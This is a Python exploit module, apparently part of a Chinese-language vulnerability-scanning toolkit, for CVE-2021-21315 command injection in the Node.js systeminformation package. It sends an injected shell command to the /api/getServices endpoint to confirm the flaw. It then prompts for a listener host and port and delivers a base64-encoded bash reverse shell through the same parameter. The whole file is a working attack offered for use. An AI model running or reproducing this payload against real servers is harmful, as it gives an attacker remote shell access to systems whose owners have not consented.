#! /usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from urllib.request import quote
import base64
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet
from rich.prompt import Prompt
urllib3.disable_warnings()
class Cve_2021_21315:
    def __init__(self):
        self.headers = None
        self.proxy = None
        self.verify = None

    def poc1(self,url):
        new_url = url + "/api/getServices?name[]=$(echo -e 'hazzzzzz' > test.txt)"
        try:
            response = requests.get(url=new_url, headers=self.headers, verify=self.verify, proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200:
                OutPrintInfo("Node-JS", f'可能存在Node.js漏洞:[b bright_red]{new_url}[/b bright_red]')
                return True
            else:
                return False
        except Exception as e:
            pass

    def payload_wrapper(self, lhost, lport, url):
        Payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        Payload = base64.b64encode(Payload.encode()).decode()
        Payload = quote(f"$(echo '{Payload}' | base64 -d | bash)")

        url = url + f'[]={Payload}'
        return url

    def poc2(self, url):
        OutPrintInfo("Node-JS", "Sending Payload ...")
        try:
            req = requests.get(url, timeout=3,headers=self.headers,proxies=self.proxy,verify=self.verify)
        except:
            # TODO: Write a better exception Handler

            OutPrintInfo("Node-JS","Check your listener")
            return
    def main(self, target):
        url = target[0].strip('/ ')
        headers = target[1]
        self.verify = target[2]
        proxy = target[3]
        reqset = ReqSet(proxy=proxy, header=headers)
        self.proxy = reqset["proxy"]
        self.headers = reqset["header"]

        OutPrintInfo("Node-JS", '开始检测Node.js CVE-2021-21315漏洞......')
        if self.poc1(url):
            choose = Prompt.ask("是否执行端口转发[b red](y/n)[/b red]")
            if choose == 'y':
                lhost = Prompt.ask("[b red]LHost[/b red]")
                lport = Prompt.ask("[b red]LPort[/b red]")
                self.poc2(self.payload_wrapper(lhost, lport, url))
        else:
            OutPrintInfo("Node-JS", f'目标{url}不存在漏洞')
        OutPrintInfo("Node-JS", "Node.js CVE-2021-21315检测结束")
